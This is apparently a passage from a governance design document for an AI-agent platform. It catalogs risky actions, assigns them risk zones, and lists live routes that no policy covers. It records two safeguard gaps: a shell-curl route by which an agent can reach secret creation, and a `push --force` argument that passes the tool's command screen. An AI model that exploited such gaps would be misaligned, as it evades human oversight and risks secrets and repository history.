| `effect:deploy.staging` | 85 | staging stage |
| `effect:deploy.prod` | 90 | absorbs `deploy.promote-prod` on split |

**Delete PR (ladder 95): impossible as stated.** GitHub cannot delete PRs —
only close. `IGitPlatformClient` supports open, get, list-files, merge — **no
close, no reopen**; `GitMediationService` likewise. Nothing closes a PR today.
Recommendation: drop "delete PR" from the ladder; reserve
`effect:git.pull-request.close` at **35** (reversible by reopen, so 95
overstates it) for when the client gains close support.

**Live code with no catalog key (found in the hunt):**

| Proposed key | Zone | Performed today by |
|---|---|---|
| `effect:git.issue.create` | 35 | `POST /api/engine/create-issue` (`EngineEndpoints.CreateIssue` → Octokit callback) — live and ungoverned; `SingleIssueCycleWorkflow` also dispatches a nonexistent `create-issues` workflow, so more issue creation is coming |
| `effect:git.issue.comment` | 35 | `POST /api/engine/issue-comment` — posts platform comments today; same 35-vs-75 flag as `git.issue.patch` |
| `effect:git.issue.labels.set` / `.remove` | 35 | `POST` + `DELETE /api/engine/issue-labels` — live, uncatalogued |
| `effect:git.pr.review-comment.create` | 40 | `IGitPlatformClient.CreatePullRequestReviewCommentAsync` — drivers implement it; no production caller found |
| `effect:git.webhook.register` | 85 | `IGitPlatformClient.RegisterWebhookAsync` — a repo-settings write; drivers implement it, no governed caller found |
| `effect:engine.context.store` | 20 | `POST /api/engine/store-context` ← `StoreRoleFindingActivity` (KB/vector write; 39-24 flagged it unaccepted — it is also uncatalogued) |
| `effect:kb.vectors.upsert` | 20 | `POST /api/kb/vector-db/upsert` (human SettingsManage route) |
| `effect:kb.vectors.delete` | 95 | `DELETE /api/kb/vector-db/delete` and `DELETE /api/kb/index` (clear) — deletes of stored knowledge |
| `effect:kb.index.trigger` | 20 | `POST /api/kb/index/trigger` |
| `effect:mcp.server.start` / `.stop` | 80 | `POST /api/kb/mcp/servers/{id}/start\|stop` — the descriptor comment already notes these have no member |
| `effect:secret.create` | 90 | `POST /api/admin/secrets` + org route — human-only (PlatformOwner / org admin); agent-reachable only via the shell-curl bypass |
| `effect:secret.rotate` | 90 | admin rotate routes + `POST /api/v1/secrets/{id}/rotate` |
| `effect:secret.version.retire` | 90 | admin retire-version routes — `platform-task:RETIRE_SECRET_VERSION` covers only the background handler, not the admin route |
| `effect:engine.ci.trigger` (or bind to `ci.tests.trigger`) | 30 | `POST /api/engine/trigger-ci` — a second, uncatalogued CI-trigger route |
| `effect:engine.task.execute` | 20 | `POST /api/engine/execute-task` — LLM execution without tools; same seam class as `llm.call` |
| `effect:engine.command` | 20 | `POST /api/engine/command` |
| `effect:engine.cycle-result` | 20 | `POST /api/engine/cycle-result` |
| `tool:git_operations.force-push` | 95 | reachable TODAY via `tool:git_operations.write` args (`push --force` passes the metachar screen); needs an arg-level split, not just a key |

**Checked and clean:** all six DI-registered tool executors (`file_read`,
`file_write`, `search_code`, `shell_execute`, `git_operations`, `run_tests`)
plus `get_acceptance_rules` have catalog members. `TammaApiClient`'s
`[PerformsEffect]` methods all map to catalogued effects; its unattributed
provider-session trio (`CreateProvider`/`ExecuteProvider`/`DisposeProvider`)
is a second model-invocation seam worth binding under `llm.call` or its own
key. **Not supported anywhere, nothing to catalog until built:** tag/release
deletion, branch protection, wiki writes, repo settings edits, PR reopen,
issue deletion.

| Date       | Version | Changes                                  | Author |
| ---------- | ------- | ---------------------------------------- | ------ |
| 2026-08-01 | 1.3.0   | Full 197-action zone table (supersedes the M1/M2 numbers); missing-action hunt: 9 ladder keys + 18 live-code keys proposed; delete-PR found impossible (close-pr reserved instead) | meywd + Claude |
